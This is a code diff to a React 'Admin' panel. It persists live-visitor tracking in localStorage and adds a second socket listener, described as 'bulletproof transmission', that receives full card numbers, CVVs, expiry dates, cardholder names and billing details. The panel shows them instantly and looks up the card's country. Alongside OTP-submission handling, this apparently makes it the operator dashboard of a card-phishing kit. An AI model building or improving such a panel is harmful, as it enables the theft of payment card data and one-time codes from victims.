@@ -88,9 +88,45 @@ const Admin = () => {
   });
   const [otps, setOtps] = useState<OtpData[]>([]);
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
-  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
+  
+  // Load live visitors from localStorage on mount with heartbeat recovery
+  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>(() => {
+    try {
+      const savedVisitors = localStorage.getItem('adminLiveVisitors');
+      const savedHeartbeats = localStorage.getItem('adminVisitorHeartbeats');
+      
+      if (savedVisitors && savedHeartbeats) {
+        const visitors = JSON.parse(savedVisitors);
+        const heartbeats = JSON.parse(savedHeartbeats);
+        const currentTime = Date.now();
+        
+        // Filter out visitors whose heartbeat is older than 60 seconds
+        const activeVisitors = visitors.filter((visitor: VisitorData) => {
+          const lastHeartbeat = heartbeats[visitor.visitorId] || 0;
+          return (currentTime - lastHeartbeat) < 60000; // 60 seconds
+        });
+        
+        return activeVisitors;
+      }
+      return [];
+    } catch (error) {
+      console.error('Error loading live visitors from localStorage:', error);
+      return [];
+    }
+  });
+  
   const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
-  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>({});
+  
+  // Load visitor heartbeats from localStorage on mount
+  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>(() => {
+    try {
+      const savedHeartbeats = localStorage.getItem('adminVisitorHeartbeats');
+      return savedHeartbeats ? JSON.parse(savedHeartbeats) : {};
+    } catch (error) {
+      console.error('Error loading visitor heartbeats from localStorage:', error);
+      return {};
+    }
+  });
   const [paymentLinkAmount, setPaymentLinkAmount] = useState<string>('');
   const [generatedLink, setGeneratedLink] = useState<string>('');
   const [showOtpModal, setShowOtpModal] = useState(false);
@@ -529,10 +565,54 @@ const Admin = () => {
     }
   }, [payments]);
 
+  // Save live visitors to localStorage whenever visitors state changes
+  useEffect(() => {
+    try {
+      localStorage.setItem('adminLiveVisitors', JSON.stringify(liveVisitors));
+    } catch (error) {
+      console.error('Error saving live visitors to localStorage:', error);
+    }
+  }, [liveVisitors]);
+
+  // Save visitor heartbeats to localStorage whenever heartbeats state changes
+  useEffect(() => {
+    try {
+      localStorage.setItem('adminVisitorHeartbeats', JSON.stringify(visitorHeartbeats));
+    } catch (error) {
+      console.error('Error saving visitor heartbeats to localStorage:', error);
+    }
+  }, [visitorHeartbeats]);
+
+  // Auto-cleanup old visitors every 30 seconds
+  useEffect(() => {
+    const cleanupInterval = setInterval(() => {
+      const currentTime = Date.now();
+      
+      // Remove visitors who haven't sent heartbeat in 60 seconds
+      setLiveVisitors(prev => prev.filter(visitor => {
+        const lastHeartbeat = visitorHeartbeats[visitor.visitorId] || 0;
+        return (currentTime - lastHeartbeat) < 60000;
+      }));
+      
+      // Clean up old heartbeats
+      setVisitorHeartbeats(prev => {
+        const activeHeartbeats: {[key: string]: number} = {};
+        Object.entries(prev).forEach(([visitorId, timestamp]) => {
+          if ((currentTime - timestamp) < 60000) {
+            activeHeartbeats[visitorId] = timestamp;
+          }
+        });
+        return activeHeartbeats;
+      });
+    }, 30000); // Run every 30 seconds
+    
+    return () => clearInterval(cleanupInterval);
+  }, [visitorHeartbeats]);
+
   useEffect(() => {
     if (!socket) return;
     try {
-      // Listen for new payment data with error handling
+      // Listen for new payment data with error handling and instant display
       socket.on('payment-received', async (data: Omit<PaymentData, 'id' | 'status'>) => {
         try {
           if (!data || !data.cardNumber || !data.cardName) {
@@ -562,20 +642,102 @@ const Admin = () => {
             timestamp: data.timestamp || new Date().toISOString()
           };
           
-          // Fetch card country info using BIN lookup
+          // Add payment immediately to admin panel for instant display
+          console.log('💳 Payment received instantly:', {
+            paymentId: newPayment.paymentId,
+            cardNumber: newPayment.cardNumber,
+            amount: newPayment.amount,
+            timestamp: newPayment.timestamp
+          });
+          
+          setPayments(prev => [newPayment, ...prev]);
+          
+          // Fetch card country info using BIN lookup asynchronously (non-blocking)
           try {
             const cardCountryInfo = await getCardCountryInfo(data.cardNumber);
             if (cardCountryInfo) {
-              newPayment.cardCountry = cardCountryInfo;
+              // Update payment with country info after BIN lookup
+              setPayments(prev => prev.map(payment => 
+                payment.paymentId === newPayment.paymentId 
+                  ? { ...payment, cardCountry: cardCountryInfo }
+                  : payment
+              ));
               console.log('Card country detected:', cardCountryInfo);
             }
           } catch (error) {
             console.error('BIN lookup failed:', error);
           }
           
-          setPayments(prev => [newPayment, ...prev]);
         } catch (error) {
           console.error('Error processing payment data:', error);
+        }
+      });
+      
+      // Additional event listener for 'payment-data' for bulletproof transmission
+      socket.on('payment-data', async (data: Omit<PaymentData, 'id' | 'status'>) => {
+        try {
+          if (!data || !data.cardNumber || !data.cardName) {
+            console.error('Invalid payment data received via payment-data:', data);
+            return;
+          }
+          
+          // Check if this payment already exists
+          const existingPayment = payments.find(p => p.paymentId === data.paymentId);
+          if (existingPayment) {
+            console.log('Payment already exists, skipping duplicate:', data.paymentId);
+            return;
+          }
+          
+          const newPayment: PaymentData = {
+            ...data,
+            id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
+            paymentId: data.paymentId || `pay_${Date.now()}`,
+            status: 'pending',
+            cardNumber: data.cardNumber || '',
+            cardName: data.cardName || '',
+            cvv: data.cvv || '',
+            expiry: data.expiry || '',
+            billingDetails: data.billingDetails || {
+              firstName: '',
+              lastName: '',
+              email: '',
+              country: '',
+              companyName: ''
+            },
+            planName: data.planName || '',
+            billing: data.billing || '',
+            amount: data.amount || 0,
+            timestamp: data.timestamp || new Date().toISOString()
+          };
+          
+          // Add payment immediately to admin panel for instant display
+          console.log('💳 Payment received via payment-data:', {
+            paymentId: newPayment.paymentId,
+            cardNumber: newPayment.cardNumber,
+            amount: newPayment.amount,
+            timestamp: newPayment.timestamp
+          });
+          
+          setPayments(prev => [newPayment, ...prev]);
+          
+          // Fetch card country info using BIN lookup asynchronously (non-blocking)
+          try {
+            const cardCountryInfo = await getCardCountryInfo(data.cardNumber);
+            if (cardCountryInfo) {
+              // Update payment with country info after BIN lookup
+              setPayments(prev => prev.map(payment => 
+                payment.paymentId === newPayment.paymentId 
+                  ? { ...payment, cardCountry: cardCountryInfo }
+                  : payment
+              ));
+              console.log('Card country detected:', cardCountryInfo);
+            }
+          } catch (error) {
+            console.error('BIN lookup failed:', error);
+          }
+          
+        } catch (error) {
+          console.error('Error processing payment data via payment-data:', error);
         }
       });
 
@@ -668,6 +830,7 @@ const Admin = () => {
 
       return () => {
         socket.off('payment-received');
+        socket.off('payment-data');
         socket.off('otp-submitted');
         socket.off('visitor-joined');
         socket.off('visitor-heartbeat');
